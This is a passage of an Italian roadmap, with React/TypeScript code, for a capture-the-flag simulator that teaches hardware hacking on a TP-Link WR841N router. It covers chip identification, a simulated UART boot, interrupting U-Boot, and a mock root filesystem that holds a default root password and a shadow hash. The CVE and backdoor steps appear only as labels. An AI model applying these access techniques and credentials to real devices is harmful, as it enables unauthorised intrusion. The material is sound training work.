# 🛡️ ROADMAP IMPLEMENTAZIONE VULNERABILITÀ - PCB CTF SIMULATOR

**Target Hardware**: TP-Link WR841N (300N)
**Chipset**: Qualcomm Atheros QCA9533-BL3A
**Basato su**: Analisi reale firmware e vulnerabilità
**Data**: 25 Gennaio 2026

---

## 📋 INDICE

1. [Executive Summary](#executive-summary)
2. [Architettura del Sistema Reale](#architettura-del-sistema-reale)
3. [Piano di Implementazione](#piano-di-implementazione)
4. [Step 1: Identificazione Hardware](#step-1-identificazione-hardware)
5. [Step 2: Accesso UART Simulato](#step-2-accesso-uart-simulato)
6. [Step 3: Bootloader U-Boot](#step-3-bootloader-u-boot)
7. [Step 4: Shell Root e Filesystem](#step-4-shell-root-e-filesystem)
8. [Step 5: Analisi Flash Memory](#step-5-analisi-flash-memory)
9. [Step 6: CVE-2023-33538 - SSID Injection](#step-6-cve-2023-33538---ssid-injection)
10. [Step 7: Backdoor Supply Chain](#step-7-backdoor-supply-chain)
11. [Struttura Dati Esercizi](#struttura-dati-esercizi)
12. [Componenti React da Implementare](#componenti-react-da-implementare)
13. [Timeline e Priorità](#timeline-e-priorità)

---

## 🎯 EXECUTIVE SUMMARY

Questo documento descrive come implementare nel **simulatore web PCB CTF** le vulnerabilità reali scoperte durante l'analisi hardware del router TP-Link WR841N. L'obiettivo è creare un ambiente didattico interattivo che riproduca fedelmente:

- **Hardware identification** con PCB viewer interattivo
- **UART access** con terminale simulato
- **Bootloader exploitation** (U-Boot)
- **Filesystem analysis** con dump simulati
- **CVE-2023-33538** (SSID Command Injection)
- **Backdoor injection** (supply chain attack)

Il simulatore permetterà agli studenti di cyber-range di:
✅ Identificare componenti hardware sul PCB
✅ Accedere a console UART simulata
✅ Esplorare filesystem Linux embedded
✅ Analizzare e sfruttare vulnerabilità reali
✅ Comprendere attacchi supply-chain

---

## 🏗️ ARCHITETTURA DEL SISTEMA REALE

### Hardware Components

```
TP-Link WR841N v11
├── CPU: Qualcomm Atheros QCA9533-BL3A (MIPS 24Kc @ 650MHz)
├── RAM: 32 MB DDR2
├── Flash: 4 MB NOR (Winbond W25Q32)
├── UART: 4-pin header (3.3V, GND, TX, RX @ 115200 baud)
├── Reset Button: Hardware reset
└── LEDs: Power, WAN, LAN1-4, WiFi, WPS
```

### Flash Memory Layout

```
MTD Partitions (4 MB total):
0x000000 - 0x020000 (128 KB)  → u-boot      (bootloader)
0x020000 - 0x120000 (1024 KB) → kernel      (Linux 2.6.31)
0x120000 - 0x3e0000 (2816 KB) → rootfs      (SquashFS read-only)
0x3e0000 - 0x3f0000 (64 KB)   → config      (JFFS2, credentials)
0x3f0000 - 0x400000 (64 KB)   → art         (WiFi calibration)
```

### Boot Sequence

```
Power ON
  ↓
U-Boot (bootloader)
  ↓ (1 second, interrupt with "tpl")
Kernel Loading (0x9f020000)
  ↓
Kernel Init (Linux 2.6.31)
  ↓
Mount rootfs (/dev/mtdblock2, squashfs, ro)
  ↓
/sbin/init (BusyBox v1.01)
  ↓
/etc/rc.d/rcS (startup scripts)
  ↓
  ├─ Network setup
  ├─ Firewall init
  ├─ httpd (web server)
  └─ getty (UART console)
  ↓
Login Prompt (root:sohoadmin)
```

### Filesystem Structure

```
/ (rootfs - SquashFS, read-only)
├── bin/       → BusyBox utilities
├── sbin/      → System binaries (ifconfig, iptables, etc.)
├── etc/       → Configuration
│   ├── passwd → root:x:0:0:root:/root:/bin/sh
│   ├── shadow → root:$1$GTN.gpri$DlSyKvZKMR9A9Uj9e9wR3/:15502:...
│   ├── inittab
│   └── rc.d/rcS
├── lib/       → Shared libraries (uClibc)
├── usr/
│   ├── bin/
│   │   ├── httpd        → Web server (vulnerability!)
│   │   └── backdoorTest → (supply-chain backdoor)
│   └── sbin/
└── web/       → Web interface files
    └── userRpm/

/tmp (ramfs, read-write)
/var (ramfs, read-write)
```

---

## 📅 PIANO DI IMPLEMENTAZIONE

### Fasi di Sviluppo

| Fase | Descrizione | Priorità | Effort | Dependencies |
|------|-------------|----------|--------|--------------|
| **1** | Identificazione Hardware sul PCB | 🔴 ALTA | 3 giorni | PCBViewer esistente |
| **2** | UART Console Simulata | 🔴 ALTA | 2 giorni | Terminal esistente |
| **3** | Bootloader U-Boot Interactive | 🟡 MEDIA | 3 giorni | Fase 2 |
| **4** | Shell Root e Filesystem Explorer | 🔴 ALTA | 4 giorni | Fase 2 |
| **5** | Flash Memory Dump Analysis | 🟡 MEDIA | 3 giorni | Fase 4 |
| **6** | CVE-2023-33538 Exploitation | 🔴 ALTA | 5 giorni | Fase 4 |
| **7** | Backdoor Supply Chain Simulation | 🟢 BASSA | 4 giorni | Fase 4 |
| **8** | UI/UX Polish e Tutorial | 🟡 MEDIA | 3 giorni | Tutte |

**Totale stimato**: ~27 giorni (5.4 settimane)

---

## 🔍 STEP 1: IDENTIFICAZIONE HARDWARE

### Obiettivo
L'utente deve identificare i componenti chiave sul PCB del router usando il multimetro e la lente d'ingrandimento.

### Componenti da Identificare

```typescript
// src/data/exercises/tp-link-wr841n.ts

export const hwIdentificationExercise: Exercise = {
  id: 'hw-identification',
  title: 'Hardware Identification - TP-Link WR841N',
  pcbImage: '/images/pcb_tplink_wr841n.jpg',
  initialFlag: 'flag{????_????_????_????}',

  components: [
    {
      id: 'cpu',
      name: 'CPU (QCA9533)',
      instruction: `Identifica il microprocessore principale del router.

È il chip più grande sulla scheda, tipicamente di forma quadrata.
Cerca la sigla "QCA9533" o "Qualcomm Atheros" stampata sopra.

Suggerimento: Usa la lente d'ingrandimento per leggere le scritte.`,
      hint: 'Cerca al centro della scheda, è il quadrato nero più grande (~1cm x 1cm)',
      flagPart: 'QCA9533',
      coords: [42, 38, 16, 18], // Percentuali sulla PCB
      componentType: 'ic',
      pins: [],
    },

    {
      id: 'flash',
      name: 'Flash Memory (W25Q32)',
      instruction: `Identifica il chip di memoria flash NOR da 4 MB.

Questo chip contiene tutto il firmware del router: bootloader, kernel,
filesystem, e configurazioni. È un chip SOIC-8 (8 pin).

Suggerimento: Cerca la sigla "W25Q32" o "25Q32" vicino al CPU.`,
      hint: 'Chip rettangolare piccolo (5mm x 6mm) con 8 pin, a destra del CPU',
      flagPart: 'W25Q32',
      coords: [65, 45, 8, 6],
      componentType: 'ic',
      pins: [
        { id: 'flash-pin1', label: 'CS#', coords: [65, 45, 1, 2] },
        { id: 'flash-pin8', label: 'VCC', coords: [65, 49, 1, 2] },
      ],
    },

    {
      id: 'ram',
      name: 'RAM (32 MB DDR2)',
      instruction: `Identifica il chip di memoria RAM.

Il router ha 32 MB di RAM DDR2 per l'esecuzione dei processi.
È un chip BGA più piccolo del CPU.

Suggerimento: Spesso integrato nel SoC o chip separato vicino al CPU.`,
      hint: 'Chip quadrato medio (8mm x 8mm) vicino al CPU, potrebbe avere sigla "EM6AB160"',
      flagPart: 'DDR2',
      coords: [50, 28, 10, 10],
      componentType: 'ic',
      pins: [],
    },

    {
      id: 'uart',
      name: 'UART Header (J1)',
      instruction: `Identifica il connettore UART per accesso seriale.

Questo è il punto critico per l'hardware hacking!
L'UART permette di accedere alla console di debug del bootloader e del kernel.

Formato: 4 pin header (3.3V, GND, TX, RX)
Baud rate: 115200

⚠️ NOTA: Sul modello v11, il pin RX ha una pista interrotta che richiede
un bypass manuale per funzionare.`,
      hint: 'Cerca vicino al bordo della scheda 4 fori circolari allineati, spesso etichettati J1 o simili',
      flagPart: 'UART',
      coords: [15, 80, 8, 12],
      componentType: 'connector',
      pins: [
        {
          id: 'uart-vcc',
          label: '3.3V',
          coords: [15, 80, 2, 3],
          valueV: 3.3,
          valueOhm: 0,
        },
        {
          id: 'uart-gnd',
          label: 'GND',
          coords: [15, 83, 2, 3],
          valueV: 0,
          valueOhm: 0,
        },
        {
          id: 'uart-tx',
          label: 'TX',
          coords: [15, 86, 2, 3],
          valueV: 3.3,
          valueOhm: 1000,
        },
        {
          id: 'uart-rx',
          label: 'RX ⚠️',
          coords: [15, 89, 2, 3],
          valueV: 0,
          valueOhm: 999999, // Pista interrotta!
          broken: true,
        },
      ],
    },
  ],
};
```

### Task di Implementazione

**1.1 Aggiornare PCBViewer per Supportare Broken Pins**

```typescript
// src/components/features/exercise/PCBViewer.tsx

interface Pin extends MeasurementPin {
  broken?: boolean;
  label?: string;
}

// Nel render dei pin
{pins.map(pin => (
  <div
    key={pin.id}
    className={cn(
      "absolute border-2 border-dashed rounded-sm",
      pin.broken
        ? "border-red-500 bg-red-500/20" // Broken pin
        : snapTarget === pin.id
        ? "border-yellow-300 bg-yellow-300/30" // Snap target
        : "border-blue-400 bg-blue-400/20" // Normal
    )}
    style={{
      left: `${pin.coords[0]}%`,
      top: `${pin.coords[1]}%`,
      width: `${pin.coords[2]}%`,
      height: `${pin.coords[3]}%`,
    }}
  >
    {pin.label && (
      <span className="text-xs text-white bg-black/60 px-1 absolute -top-5">
        {pin.label}
      </span>
    )}
    {pin.broken && (
      <span className="absolute inset-0 flex items-center justify-center">
        <span className="text-red-500 text-xl">⚠️</span>
      </span>
    )}
  </div>
))}
```

**1.2 Aggiungere Dialog Informativo per Broken Pins**

```typescript
// src/components/features/exercise/BrokenPinDialog.tsx

'use client';

import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { AlertTriangle } from 'lucide-react';

interface BrokenPinDialogProps {
  open: boolean;
  onClose: () => void;
  pinLabel: string;
}

export function BrokenPinDialog({ open, onClose, pinLabel }: BrokenPinDialogProps) {
  return (
    <Dialog open={open} onOpenChange={onClose}>
      <DialogContent className="max-w-md">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2 text-red-500">
            <AlertTriangle className="w-6 h-6" />
            Pista Interrotta Rilevata
          </DialogTitle>
          <DialogDescription>
            <div className="space-y-3 mt-4">
              <p>
                Il multimetro mostra resistenza infinita sul pin <strong>{pinLabel}</strong>.
              </p>
              <p className="text-yellow-400">
                🔍 <strong>Causa:</strong> La pista PCB dal chip al pin header è interrotta.
              </p>
              <p>
                <strong>Soluzione hardware:</strong>
              </p>
              <ul className="list-disc list-inside space-y-1 text-sm">
                <li>Utilizzare un multimetro per tracciare la pista dal chip al pin</li>
                <li>Identificare il punto di interruzione</li>
                <li>Collegare i due punti con un jumper wire o puntali PCBite</li>
                <li>Verificare continuità con multimetro</li>
              </ul>
              <div className="mt-4 p-3 bg-blue-900/30 border border-blue-500 rounded">
                <p className="text-xs">
                  💡 Nel simulatore, considera questo completato una volta identificato il problema.
                  In un scenario reale, sarebbe necessario il bypass fisico.
                </p>
              </div>
            </div>
          </DialogDescription>
        </DialogHeader>
      </DialogContent>
    </Dialog>
  );
}
```

**1.3 Integrare nel Multimetro**

```typescript
// src/components/features/exercise/Multimeter.tsx

// Aggiungere logica detection broken pin
const pin1Data = exerciseData.pins.find(p => p.id === probe1.hookedTo);
const pin2Data = exerciseData.pins.find(p => p.id === probe2.hookedTo);

useEffect(() => {
  if (pin1Data?.broken) {
    // Mostra dialog broken pin
    setBrokenPinDialogOpen(true);
    setBrokenPinLabel(pin1Data.label || pin1Data.id);
  }
}, [probe1.hookedTo]);

// Nel display LCD
const displayValue = useMemo(() => {
  if (!pin1Data) return '---';

  if (pin1Data.broken) {
    return multimeterMode === 'Ohm' ? 'OL' : '0.00'; // Overload per resistenza infinita
  }

  // ... logica esistente
}, [pin1Data, pin2Data, multimeterMode]);
```

**Effort**: 🔨🔨 (1.5 giorni)

---

## 🖥️ STEP 2: ACCESSO UART SIMULATO

### Obiettivo
Simulare l'accesso alla console UART con bootlog reale e interazione con bootloader.

### Implementazione Console UART

**2.1 Estendere il Terminal Esistente**

```typescript
// src/components/features/exercise/UARTTerminal.tsx

'use client';

import { useState, useEffect, useRef } from 'react';
import { Terminal as TerminalIcon, Zap } from 'lucide-react';

interface UARTTerminalProps {
  baudRate?: number;
  onBootComplete?: () => void;
}

export function UARTTerminal({ baudRate = 115200, onBootComplete }: UARTTerminalProps) {
  const [output, setOutput] = useState<string[]>([]);
  const [isBooting, setIsBooting] = useState(false);
  const [bootStage, setBootStage] = useState(0);
  const outputRef = useRef<HTMLDivElement>(null);

  // Simula boot sequence
  const startBoot = async () => {
    setIsBooting(true);
    setOutput([]);

    const bootSequence = [
      { delay: 500, text: '' },
      { delay: 100, text: 'U-Boot 1.1.4 (Jun 16 2015 - 14:12:19)' },
      { delay: 100, text: '' },
      { delay: 100, text: 'ap143-2.0 - Honey Bee 2.0' },
      { delay: 100, text: '' },
      { delay: 200, text: 'DRAM:  32 MB' },
      { delay: 200, text: 'Flash Manuf Id 0xef, DeviceId0 0x40, DeviceId1 0x16' },
      { delay: 100, text: 'flash size 4MB, sector count = 64' },
      { delay: 100, text: 'Flash:  4 MB' },
      { delay: 100, text: 'Using default environment' },
      { delay: 100, text: '' },
      { delay: 100, text: 'In:    serial' },
      { delay: 50, text: 'Out:   serial' },
      { delay: 50, text: 'Err:   serial' },
      { delay: 200, text: 'Net:   ath_gmac_enet_initialize...' },
      { delay: 150, text: 'ath_gmac_enet_initialize: reset mask:c02200' },
      { delay: 100, text: 'Scorpion ---->S27 PHY*' },
      { delay: 100, text: 'S27 reg init' },
      { delay: 100, text: ': cfg1 0x800c0000 cfg2 0x7114' },
      { delay: 100, text: 'eth0: ba:be:fa:ce:08:41' },
      { delay: 200, text: 'eth0 up' },
      { delay: 100, text: 'Honey Bee ---->  MAC 1 S27 PHY *' },
      { delay: 100, text: 'eth1 up' },
      { delay: 100, text: 'eth0, eth1' },
      { delay: 200, text: 'Setting 0x181162c0 to 0x60c1a100' },
      { delay: 100, text: 'is_auto_upload_firmware=0' },
      { delay: 1000, text: '\x1b[33mAutobooting in 1 seconds\x1b[0m' }, // Yellow text
      { delay: 1000, text: '## Booting image at 9f020000 ...' },
      { delay: 500, text: '   Uncompressing Kernel Image ... OK' },
      { delay: 300, text: '' },
      { delay: 100, text: 'Starting kernel ...' },
      { delay: 200, text: '' },
      { delay: 100, text: 'Booting QCA953x' },
      { delay: 100, text: ' Linux version 2.6.31 (tomcat@buildserver) (gcc version 4.3.3 (GCC) ) #61 Tue Jun 16 14:17:33 CST 2015' },
      { delay: 100, text: 'Ram size passed from bootloader =32M' },
      { delay: 100, text: 'flash_size passed from bootloader = 4' },
      { delay: 100, text: 'CPU revision is: 00019374 (MIPS 24Kc)' },
      { delay: 150, text: ' ath_sys_frequency: cpu apb ddr apb cpu 650 ddr 393 ahb 216' },
      { delay: 100, text: 'Determined physical RAM map:' },
      { delay: 50, text: ' memory: 02000000 @ 00000000 (usable)' },
      { delay: 200, text: 'Kernel command line: console=ttyS0,115200 root=31:2 rootfstype=squashfs init=/sbin/init mtdparts=ath-nor0:128k(u-boot),1024k(kernel),2816k(rootfs),64k(config),64k(art) mem=32M' },
      { delay: 300, text: '...' },
      { delay: 200, text: 'VFS: Mounted root (squashfs filesystem) readonly on device 31:2.' },
      { delay: 100, text: 'Freeing unused kernel memory: 120k freed' },
      { delay: 150, text: '\x1b[32minit started:  BusyBox v1.01 (2015.06.16-06:24+0000) multi-call binary\x1b[0m' },
      { delay: 200, text: 'This Board use 2.6.31' },
      { delay: 1000, text: '...' },
      { delay: 500, text: '' },
      { delay: 200, text: '\x1b[1m (none) login: \x1b[0m' },
    ];

    for (let i = 0; i < bootSequence.length; i++) {
      await new Promise(resolve => setTimeout(resolve, bootSequence[i].delay));
      setOutput(prev => [...prev, bootSequence[i].text]);
      setBootStage(i);

      // Auto-scroll
      if (outputRef.current) {
        outputRef.current.scrollTop = outputRef.current.scrollHeight;
      }
    }

    setIsBooting(false);
    onBootComplete?.();
  };

  return (
    <div className="flex flex-col h-full bg-black text-green-400 font-mono text-sm">
      {/* Header */}
      <div className="flex items-center justify-between px-4 py-2 bg-gray-900 border-b border-gray-700">
        <div className="flex items-center gap-2">
          <TerminalIcon className="w-4 h-4" />
          <span className="font-semibold">UART Console</span>
          <span className="text-xs text-gray-500">({baudRate} baud, 8N1)</span>
        </div>
        <button
          onClick={startBoot}
          disabled={isBooting}
          className="flex items-center gap-2 px-3 py-1 bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 rounded text-xs text-white transition"
        >
          <Zap className="w-3 h-3" />
          {isBooting ? 'Booting...' : 'Power ON'}
        </button>
      </div>

      {/* Output */}
      <div
        ref={outputRef}
        className="flex-1 overflow-y-auto p-4 space-y-0.5"
      >
        {output.length === 0 && (
          <div className="text-gray-600 text-center mt-8">
            <p>UART Console Ready</p>
            <p className="text-xs mt-2">Click "Power ON" to boot the device</p>
          </div>
        )}

        {output.map((line, i) => (
          <div
            key={i}
            className={cn(
              "whitespace-pre-wrap break-all",
              line.includes('login:') && 'text-yellow-400 font-bold animate-pulse'
            )}
            dangerouslySetInnerHTML={{ __html: line.replace(/\x1b\[[0-9;]*m/g, '') }} // Strip ANSI codes for now
          />
        ))}

        {isBooting && (
          <div className="flex items-center gap-2 mt-2">
            <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
            <span className="text-xs text-gray-500">Boot stage {bootStage}/{42}</span>
          </div>
        )}
      </div>
    </div>
  );
}
```

**2.2 Integrare UARTTerminal nella Sidebar**

```typescript
// src/store/exerciseStore.ts

// Aggiungere nuovo tool
export type Tool = 'pointer' | 'magnifier' | 'multimeter' | 'terminal' | 'uart';

// src/components/layout/Sidebar.tsx
import { Cpu } from 'lucide-react';

<ToolButton
  icon={Cpu}
  label="UART Console"
  active={activeTool === 'uart'}
  onClick={() => setActiveTool('uart')}
  shortcut="U"
/>
```

**2.3 Condizionale nel PCBViewer**

```typescript
// src/components/features/exercise/PCBViewer.tsx

{activeTool === 'uart' && (
  <div className="absolute inset-0 bg-black/80 z-30 flex items-center justify-center">
    <div className="w-full max-w-4xl h-[600px] bg-gray-900 rounded-lg shadow-2xl overflow-hidden">
      <UARTTerminal
        baudRate={115200}
        onBootComplete={() => {
          // Unlock prossimo step
          console.log('Boot completed!');
        }}
      />
    </div>
  </div>
)}
```

**Effort**: 🔨🔨 (1.5 giorni)

---

## ⚙️ STEP 3: BOOTLOADER U-BOOT

### Obiettivo
Simulare l'interazione con U-Boot per interrupt boot, esplorazione environment, e modifica parametri.

### Implementazione

**3.1 U-Boot Interactive Shell**

```typescript
// src/components/features/exercise/UBootShell.tsx

'use client';

import { useState, useEffect } from 'react';

interface UBootCommand {
  command: string;
  handler: (args: string[]) => string | string[];
}

export function UBootShell() {
  const [output, setOutput] = useState<string[]>([
    'U-Boot 1.1.4 (Jun 16 2015 - 14:12:19)',
    'ap143-2.0 - Honey Bee 2.0',
    '',
    'Hit "tpl" to stop autoboot:  1',
  ]);
  const [input, setInput] = useState('');
  const [interrupted, setInterrupted] = useState(false);
  const [countdown, setCountdown] = useState(1);
  const [envVars, setEnvVars] = useState({
    bootargs: 'console=ttyS0,115200 root=31:02 rootfstype=jffs2 init=/sbin/init mtdparts=ath-nor0:32k(u-boot1),32k(u-boot2),3008k(rootfs),896k(uImage),64k(mib0),64k(ART)',
    bootcmd: 'bootm 0x9f020000',
    bootdelay: '1',
    baudrate: '115200',
    ethaddr: 'ba:be:fa:ce:08:41',
    ipaddr: '192.168.1.1',
    serverip: '192.168.1.100',
    stderr: 'serial',
    stdin: 'serial',
    stdout: 'serial',
  });

  const commands: Record<string, UBootCommand> = {
    help: {
      command: 'help',
      handler: () => [
        'Available commands:',
        'boot     - boot default, i.e., run bootcmd',
        'bootm    - boot application image from memory',
        'cp       - memory copy',
        'erase    - erase FLASH memory',
        'md       - memory display',
        'mm       - memory modify (auto-incrementing)',
        'mw       - memory write (fill)',
        'nm       - memory modify (constant address)',
        'ping     - send ICMP ECHO_REQUEST to network host',
        'printenv - print environment variables',
        'reset    - Perform RESET of the CPU',
        'run      - run commands in an environment variable',
        'setenv   - set environment variables',
        'tftpboot - boot image via network using TFTP protocol',
        'version  - print monitor version',
      ],
    },

    printenv: {
      command: 'printenv',
      handler: (args) => {
        if (args.length === 0) {
          return Object.entries(envVars).map(([key, value]) => `${key}=${value}`);
        } else {
          const key = args[0];
          return envVars[key] ? `${key}=${envVars[key]}` : `## Error: "${key}" not defined`;
        }
      },
    },

    setenv: {
      command: 'setenv',
      handler: (args) => {
        if (args.length < 2) {
          return 'Usage: setenv name value ...';
        }
        const key = args[0];
        const value = args.slice(1).join(' ');
        setEnvVars(prev => ({ ...prev, [key]: value }));
        return `## Setting ${key}=${value}`;
      },
    },

    version: {
      command: 'version',
      handler: () => [
        'U-Boot 1.1.4 (Jun 16 2015 - 14:12:19)',
        'QCA953x - Honey Bee 2.0',
      ],
    },

    md: {
      command: 'md',
      handler: (args) => {
        const addr = args[0] || '0x9f020000';
        return [
          `${addr}: 27051956  464c457f  00010102  00000000    V..'...ELF......`,
          `${addr}+10: 00000000  00020008  00000001  80060000    ................`,
          `${addr}+20: 00000034  00002000  00000005  00000028    4... ...(...(...`,
        ];
      },
    },

    ping: {
      command: 'ping',
      handler: (args) => {
        const ip = args[0] || '192.168.1.1';
        return [
          `host ${ip} is alive`,
        ];
      },
    },

    reset: {
      command: 'reset',
      handler: () => {
        setTimeout(() => {
          setOutput([]);
          setInterrupted(false);
          setCountdown(1);
        }, 500);
        return 'Resetting CPU ...';
      },
    },

    boot: {
      command: 'boot',
      handler: () => {
        return [
          '## Booting image at 9f020000 ...',
          '   Uncompressing Kernel Image ... OK',
          '',
          'Starting kernel ...',
          '',
          '(boot continues...)',
        ];
      },
    },
  };

  // Autoboot countdown
  useEffect(() => {
    if (!interrupted && countdown > 0) {
      const timer = setTimeout(() => {
        setCountdown(prev => prev - 1);
        setOutput(prev => [...prev, `Hit "tpl" to stop autoboot:  ${countdown - 1}`]);
      }, 1000);
      return () => clearTimeout(timer);
    } else if (!interrupted && countdown === 0) {
      setOutput(prev => [...prev, '', '## Booting default image...', '(use "tpl" next time to interrupt)']);
    }
  }, [countdown, interrupted]);

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      const cmd = input.trim();

      // Interrupt boot
      if (cmd === 'tpl' && !interrupted) {
        setInterrupted(true);
        setOutput(prev => [...prev, '', 'ath> ']);
        setInput('');
        return;
      }

      // Process command
      if (interrupted) {
        const [command, ...args] = cmd.split(/\s+/);
        const cmdHandler = commands[command.toLowerCase()];

        setOutput(prev => [...prev, `ath> ${cmd}`]);

        if (cmdHandler) {
          const result = cmdHandler.handler(args);
          const resultLines = Array.isArray(result) ? result : [result];
          setOutput(prev => [...prev, ...resultLines, '']);
        } else if (cmd) {
          setOutput(prev => [...prev, `Unknown command '${command}' - try 'help'`, '']);
        }

        setOutput(prev => [...prev, 'ath> ']);
      }

      setInput('');
    }
  };

  return (
    <div className="flex flex-col h-full bg-black text-green-400 font-mono text-sm p-4">
      <div className="flex-1 overflow-y-auto whitespace-pre-wrap">
        {output.map((line, i) => (
          <div key={i}>{line}</div>
        ))}
      </div>

      {interrupted && (
        <div className="flex items-center gap-2 border-t border-gray-700 pt-2">
          <span className="text-yellow-400">ath&gt;</span>
          <input
            type="text"
            value={input}
            onChange={(e) => setInput(e.target.value)}
            onKeyPress={handleKeyPress}
            className="flex-1 bg-transparent outline-none text-green-400"
            placeholder="Type 'help' for available commands"
            autoFocus
          />
        </div>
      )}

      {!interrupted && countdown > 0 && (
        <div className="border-t border-gray-700 pt-2">
          <input
            type="text"
            value={input}
            onChange={(e) => setInput(e.target.value)}
            onKeyPress={handleKeyPress}
            className="w-full bg-transparent outline-none text-yellow-400"
            placeholder="Type 'tpl' to interrupt boot..."
            autoFocus
          />
        </div>
      )}
    </div>
  );
}
```

**3.2 Task per lo Studente**

```typescript
// Nel componente InstructionsPanel

const ubootTasks = [
  {
    step: 1,
    instruction: 'Interrompi il boot digitando "tpl" entro 1 secondo',
    validation: () => interrupted === true,
  },
  {
    step: 2,
    instruction: 'Esplora le variabili di ambiente con "printenv"',
    hint: 'Nota l\'incoerenza: bootargs indica rootfstype=jffs2, ma il kernel reale usa squashfs!',
    validation: () => commandHistory.includes('printenv'),
  },
  {
    step: 3,
    instruction: 'Prova a modificare bootargs con "setenv bootargs ..."',
    hint: 'Le modifiche non saranno persistenti senza "saveenv" (non disponibile)',
    validation: () => commandHistory.some(cmd => cmd.startsWith('setenv bootargs')),
  },
  {
    step: 4,
    instruction: 'Ottieni la flag analizzando l\'incoerenza tra U-Boot e kernel',
    flagPart: 'bootargs_mismatch',
  },
];
```

**Effort**: 🔨🔨🔨 (2 giorni)

---

## 📁 STEP 4: SHELL ROOT E FILESYSTEM

### Obiettivo
Fornire una shell Linux interattiva completa che simula il sistema del router.

### Implementazione

**4.1 Enhanced Linux Shell**

```typescript
// src/components/features/exercise/LinuxShell.tsx

'use client';

import { useState } from 'react';

interface FileSystemNode {
  type: 'file' | 'directory';
  name: string;
  content?: string;
  children?: Record<string, FileSystemNode>;
  permissions?: string;
  owner?: string;
  size?: number;
}

const routerFileSystem: Record<string, FileSystemNode> = {
  '/': {
    type: 'directory',
    name: '/',
    permissions: 'drwxr-xr-x',
    owner: 'root:root',
    children: {
      'bin': {
        type: 'directory',
        name: 'bin',
        permissions: 'drwxr-xr-x',
        owner: 'root:root',
        children: {
          'busybox': {
            type: 'file',
            name: 'busybox',
            permissions: '-rwxr-xr-x',
            size: 245760,
            content: 'ELF binary'
          },
          'cat': { type: 'file', name: 'cat', permissions: 'lrwxrwxrwx', content: 'busybox' },
          'ls': { type: 'file', name: 'ls', permissions: 'lrwxrwxrwx', content: 'busybox' },
          'sh': { type: 'file', name: 'sh', permissions: 'lrwxrwxrwx', content: 'busybox' },
          // ... altri binari
        },
      },
      'etc': {
        type: 'directory',
        name: 'etc',
        permissions: 'drwxr-xr-x',
        owner: 'root:root',
        children: {
          'passwd': {
            type: 'file',
            name: 'passwd',
            permissions: '-rw-r--r--',
            size: 87,
            content: 'root:x:0:0:root:/root:/bin/sh\nnobody:x:99:99:Nobody:/:/bin/false\n',
          },
          'shadow': {
            type: 'file',
            name: 'shadow',
            permissions: '-rw-------',
            size: 112,
            content: 'root:$1$GTN.gpri$DlSyKvZKMR9A9Uj9e9wR3/:15502:0:99999:7:::\nnobody:*:15502:0:99999:7:::\n',
          },
          'inittab': {
            type: 'file',
            name: 'inittab',
            permissions: '-rw-r--r--',
            size: 234,
            content: `::sysinit:/etc/rc.d/rcS
::respawn:/sbin/getty ttyS0 115200
::shutdown:/bin/umount -a
`,
          },
          'rc.d': {
            type: 'directory',
            name: 'rc.d',
            permissions: 'drwxr-xr-x',
            owner: 'root:root',
            children: {
              'rcS': {
                type: 'file',
                name: 'rcS',
                permissions: '-rwxr-xr-x',
                size: 1547,
                content: `#!/bin/sh
# Startup script

# Mount filesystems
mount -a

# Network init
/usr/sbin/config-usbnet.sh

# Start httpd (WEB SERVER - VULNERABLE!)
/usr/bin/httpd &

# Start dropbear SSH
/usr/sbin/dropbear

echo "Boot complete"
`,
              },
            },
          },
        },
      },
      'usr': {
        type: 'directory',
        name: 'usr',
        permissions: 'drwxr-xr-x',
        owner: 'root:root',
        children: {
          'bin': {
            type: 'directory',
            name: 'bin',
            permissions: 'drwxr-xr-x',
            owner: 'root:root',
            children: {
              'httpd': {
                type: 'file',
                name: 'httpd',
                permissions: '-rwxr-xr-x',
                size: 4872316,
                content: 'ELF binary - VULNERABLE TO CVE-2023-33538',
              },
              'backdoorTest': {
                type: 'file',
                name: 'backdoorTest',
                permissions: '-rwxr-xr-x',
                size: 133184,
                content: 'ELF binary - REVERSE SHELL BACKDOOR',
              },
              'dropbear': {
                type: 'file',
                name: 'dropbear',
                permissions: '-rwxr-xr-x',
                size: 245632,
                content: 'ELF binary - SSH server',
              },
            },
          },
        },
      },
      'proc': {
        type: 'directory',
        name: 'proc',
        permissions: 'dr-xr-xr-x',
        owner: 'root:root',
        children: {
          'mtd': {
            type: 'file',
            name: 'mtd',
            permissions: '-r--r--r--',
            content: `dev:    size   erasesize  name
mtd0: 00020000 00010000 "u-boot"
mtd1: 00100000 00010000 "kernel"
mtd2: 002c0000 00010000 "rootfs"
mtd3: 00010000 00010000 "config"
mtd4: 00010000 00010000 "art"
`,
          },
          'cpuinfo': {
            type: 'file',
            name: 'cpuinfo',
            permissions: '-r--r--r--',
            content: `system type\t\t: Qualcomm Atheros QCA9533 rev 0
processor\t\t: 0
cpu model\t\t: MIPS 24Kc V7.4
BogoMIPS\t\t: 433.15
`,
          },
        },
      },
      'dev': {
        type: 'directory',
        name: 'dev',
        permissions: 'drwxr-xr-x',
        owner: 'root:root',
        children: {
          'mtdblock0': { type: 'file', name: 'mtdblock0', permissions: 'brw-rw----', content: 'block device' },
          'mtdblock2': { type: 'file', name: 'mtdblock2', permissions: 'brw-rw----', content: 'block device' },
          'mtdblock3': { type: 'file', name: 'mtdblock3', permissions: 'brw-rw----', content: 'block device' },
        },
      },
    },
  },
};

export function LinuxShell() {
  const [currentPath, setCurrentPath] = useState('/');
  const [output, setOutput] = useState<string[]>([
    'Welcome to BusyBox v1.01 (2015.06.16-06:24+0000) multi-call binary',
    '',
    'Login successful. You are now root.',
    '',
  ]);
  const [input, setInput] = useState('');
  const [commandHistory, setCommandHistory] = useState<string[]>([]);
  const [historyIndex, setHistoryIndex] = useState(-1);

  const resolvePath = (path: string): string => {
    if (path.startsWith('/')) return path;
    if (path === '..') {
      const parts = currentPath.split('/').filter(Boolean);
      parts.pop();
      return '/' + parts.join('/');
    }
    const current = currentPath === '/' ? '' : currentPath;
    return `${current}/${path}`.replace(/\/+/g, '/');
  };

  const getNode = (path: string): FileSystemNode | null => {
    const parts = path.split('/').filter(Boolean);
    let node = routerFileSystem['/'];

    for (const part of parts) {
      if (node.type !== 'directory' || !node.children) return null;
      node = node.children[part];
      if (!node) return null;
    }

    return node;
  };

  const commands: Record<string, (args: string[]) => string[]> = {
    ls: (args) => {
